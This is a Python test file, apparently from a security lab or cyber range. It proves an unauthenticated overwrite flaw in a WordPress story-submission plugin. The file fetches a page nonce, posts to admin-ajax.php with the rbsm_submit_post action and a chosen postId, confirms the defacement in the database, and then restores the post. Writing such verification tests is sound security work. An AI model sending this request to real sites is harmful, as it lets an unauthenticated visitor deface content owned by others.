import re

from conftest import TARGET_PUBLIC
from range import ATTACKER, run

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
NONCE = re.compile(r'"nonce":"([a-f0-9]+)"')


def _target_post():
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT ID,post_author,post_status,post_title,post_content,post_excerpt "
        "FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;",
    ]).stdout
    post_id, author, status, title, content, excerpt = out.rstrip("\n").split("\t", 5)
    return {
        "ID": post_id,
        "post_author": author,
        "post_status": status,
        "post_title": title,
        "post_content": content,
        "post_excerpt": excerpt,
    }


def _row(post_id):
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT post_title,post_content,post_excerpt,post_status FROM wp_posts "
        f"WHERE ID={post_id};",
    ]).stdout
    title, content, excerpt, status = out.rstrip("\n").split("\t", 3)
    return {
        "post_title": title,
        "post_content": content,
        "post_excerpt": excerpt,
        "post_status": status,
    }


def _nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/submit-a-story/",
    ]).stdout
    found = NONCE.search(page)
    assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
    return found.group(1)


def _overwrite_post(nonce, post_id, title, excerpt, content):
    return run(ATTACKER, [
        "curl", "-s", "--max-time", "20",
        "-H", CORP_HOST,
        "--data-urlencode", "action=rbsm_submit_post",
        "--data-urlencode", f"_nonce={nonce}",
        "--data-urlencode", "formId=1",
        "--data-urlencode", f"postId={post_id}",
        "--data-urlencode", f"title={title}",
        "--data-urlencode", f"excerpt={excerpt}",
        "--data-urlencode", f"content={content}",
        "--data-urlencode", "userName=Anonymous Contributor",
        "--data-urlencode", "userEmail=anon@example.com",
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
    ]).stdout.strip()


def _restore(original):
    run(CORP, [
        "wp", "--allow-root", "post", "update", original["ID"],
        f"--post_title={original['post_title']}",
        f"--post_excerpt={original['post_excerpt']}",
        f"--post_status={original['post_status']}",
    ])
    run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
        "UPDATE wp_posts SET post_content=%s WHERE ID=%s" % (
            _sql_quote(original["post_content"]), original["ID"],
        ),
    ])
    run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], "rbsm_form_id"])
    run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], "rbsm_author_info"])


def _sql_quote(value):
    return "'" + value.replace("'", "\\'") + "'"


def test_the_unauthenticated_postid_overwrite_alters_an_existing_not_owned_post(stack_is_up):
    original = _target_post()
    title = "Defaced by an unauthenticated guest"
    excerpt = "overwritten without owning this post"
    content = "overwritten without owning this post via rbsm_submit_post postId overwrite"

    try:
        response = _overwrite_post(_nonce(), original["ID"], title, excerpt, content)
        assert '"success":true' in response, f"the postId overwrite was refused: {response!r}"
        assert f'"post_id":{original["ID"]}' in response

        after = _row(original["ID"])
        assert after["post_title"] == title
        assert after["post_content"] == content
        assert after["post_title"] != original["post_title"]
        assert after["post_content"] != original["post_content"]
    finally:
        _restore(original)
        restored = _row(original["ID"])
        assert restored == {
            "post_title": original["post_title"],
            "post_content": original["post_content"],
            "post_excerpt": original["post_excerpt"],
            "post_status": original["post_status"],
        }
